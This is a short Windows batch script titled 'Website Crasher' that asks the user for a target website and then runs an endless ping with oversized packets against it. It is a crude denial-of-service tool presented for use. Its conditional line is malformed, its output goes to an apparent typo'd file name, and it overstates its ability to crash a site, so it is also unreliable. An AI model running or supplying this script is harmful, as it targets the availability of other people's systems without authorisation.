:A
@echo off
title Website Crasher - jHeight
color 0e
echo Enter the website you would like to crash :
set input=
set /p input=Enter your website here
if %input%==goto A if NOT B
echo Processing Request.
ping localhost>nul
echo To stop the crashing process, press CONTROL + C...
ping localhost>nul
cls
echo --------------------------------------------------
echo Site Being Crashed --- Do Not Close the Windows --- Press Control + C to End
echo --------------------------------------------------
ping %input% -t -l 10000>nir
